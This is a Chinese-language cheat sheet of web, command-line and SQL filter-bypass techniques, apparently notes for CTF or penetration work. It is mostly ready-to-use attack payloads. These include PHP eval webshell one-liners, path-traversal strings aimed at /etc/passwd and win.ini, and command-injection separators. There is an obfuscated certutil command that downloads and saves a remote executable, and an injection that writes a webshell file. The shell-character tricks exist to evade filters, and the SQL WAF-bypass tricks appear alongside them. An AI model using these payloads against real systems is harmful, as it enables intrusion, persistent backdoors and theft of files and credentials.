# Web bypass

- [Bypass Linux Shell Restrictions](#linux-shell-bypass)
- 空格绕过 `a=system ('cat /flag');`
- 大小写绕过
- %0a 绕过
- unicode 绕过, `t => \u0074`
- ~ 反码绕过
- [PHP_INCLUDE_TO_SHELL_CHAR_DICT](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)
- splstack 绕过匹配 O 开头的序列化数据； [2023 安洵杯 4 号的罗纳尔多](https://mp.weixin.qq.com/s/azbY19cBgs3MgVdo7i-OhQ)
- \_\_halt_compiler();来结束 php 代码执行流程 同上链接
- [详细|waf 绕过学习](https://mp.weixin.qq.com/s/OeZsKohqe87-ieIuW7L9tA)

[实战绕过某 WAF+拿 shell 组合拳](https://mp.weixin.qq.com/s/Q57dOjq279kqOFtSA1mV8Q)
[webshell 检测算法实践](https://mp.weixin.qq.com/s/M4umpduFCI50zOO-5080cw)

| bypass        | payload                                                |     |
| ------------- | ------------------------------------------------------ | --- |
| <?            | `<script language="php">@eval($\_POST['1']);</script>` |     |
| %2F 代替/     | ?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd             |     |
| 二次编码(%25) | ?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd     |
| 加入+         | ?filename=.+./.+./bin/redacted.dll                     |
| %00           | ?filename=.%00./file.php <br>/etc/passwd%00.jpg        |
| \             | ?filename=..%5c..%5c/windows/win.ini                   |

## bypass filter_var($url, FILTER_VALIDATE_URL)

`?url=http://`

## bypass file_get_contents($text,'r')==="welcome to the zjctf"

`?text=data://test/plain,welcome&file=php://filter/resource=useless.php`

# Cmd bypass

```sh
c""""e""""r""""t""""u""""t""""i""""l.exe -urlcache -split -f http://ip/6666.exe 6666.exe

copy /b 1.jpg+2.jpg 3 /y

```

# Linux/Windows shell bypass

[Bypass Linux Shell Restrictions](https://mp.weixin.qq.com/s/8QTax87lorWNnOQR8p1ORQ)

| windows 管道符   | Description                  | 示例                   |
| ---------------- | ---------------------------- | ---------------------- |
| \|               | 直接执⾏后⾯的语句。         | ping 127.0.0.1\|whoami |
| \|\|             | 前面为假时执⾏               | ping 2 \|\| whoami     |
| &                | 前⾯可真可假                 | ping 127.0.0.1&whoami  |
| &&               | 前⾯只能为真                 | ping 127.0.0.1&&whoami |
| **Linux 管道符** |                              |                        |
| ;                | 执⾏完前⾯的语句再执⾏后⾯的 | ping 127.0.0.1;whoami  |
| \|               | 显示后⾯语句的执⾏结果       | ping 127.0.0.1\|whoami |
| \|\|             | 前面为假时执⾏               | ping 1\|\|whoami       |
| &                | 前⾯可真可假                 | ping 127.0.0.1&whoami  |
| &&               | 前⾯只能为真                 | ping 127.0.0.1&&whoami |

/bin/bash 支持(新版 kali 需要切换为 bash)

| symbol   | bypass       | url 中 | 示例                                                                                    |
| -------- | ------------ | ------ | --------------------------------------------------------------------------------------- |
| >        | ${PS2}       |        |
| +        | ${PS4}       |        |
| tab      | ${9}         | %09    |
| 空格     | ${IFS}       |        | cat${IFS}/flag <br> cat${IFS}$9/flag<br> cat$IFS$9/flag                                 |
|          | +            |        |                                                                                         |
|          | {}           |        | {ls,-l}                                                                                 |
|          | <            |        | cat</flag                                                                               |
|          | url:%20, %09 |        | cat%09/flag <br>X=$'cat\x09./flag.php';$X                                               |
| 任意字符 | ${SHELLOPTS} |        | `${SHELLOPTS:1:1}  -- r`<br>`${SHELLOPTS:3:1}  -- c`<br>`${SHELLOPTS:3:1}at -- cat`<br> |
| 任意字符 | \            |        | c\a\t /flag                                                                             |
| 任意字符 | \*           |        | cat f\* 　　　 cat /???/???sw? <br> ?代表⼀个字符<br> []代表范围内任意一个字符<br>      |
| 任意字符 | base64       |        | `echo "aWQ=" \| base64 -d` -- id                                                        |
| 任意字符 | ''           |        | c''at /flag                                                                             |
| 任意字符 | ""           |        | c""at /flag                                                                             |
| 任意字符 | 特殊变量@t   |        | ca$@t /flag                                                                             |

`${IFS}` 对应 内部字段分隔符

```sh
127.0.0.1 &echo "<?php @eval(\$_POST['a']);?>" >> shell.php

过滤"ping -c 4 {$_GET['ip']}"
    =>|ls, |cat flag.php, 看源码,
    注意: 使用| 这不是连续执行, 只能一级传一级,要连续就用127.0.0.1;ls
```

# Sql bypass

- https://github.com/Xyntax/waf-bypass/blob/master/payload/sql.txt
- https://lexsd6.github.io/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/#%E6%96%B9%E6%B3%95%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87
- [sql 注入 bypass waf 工具（1 月 18 日更新）](https://mp.weixin.qq.com/s/qritLmRwP-Q5OLskxNWSVw)
- [Sql 注入过安全狗](https://mp.weixin.qq.com/s/Ighou2aYORZ7rGvJfpeeHg)

| bypass |                     |                                                                                                                                            |
| ------ | ------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| 大小写 |                     |                                                                                                                                            |
| =      | like/regexp         | <> 等价于 !=                                                                                                                               |
| 空格   | /\*\*/ 或 +         | php 可用 %09、%0A、 %0B、 %0C、 %0D、%A0、%20 <br>and/or 后面可以跟上偶数个!、~可以替代空格 <br>and/or 前的空格可用省略. <br>'后空格可省略 |
| select | [handler](#handler) |                                                                                                                                            |

## sql/handler

```sql
handler auth_permission open as yunensec;
handler yunensec read first;
handler yunensec read next;
handler yunensec close;
```
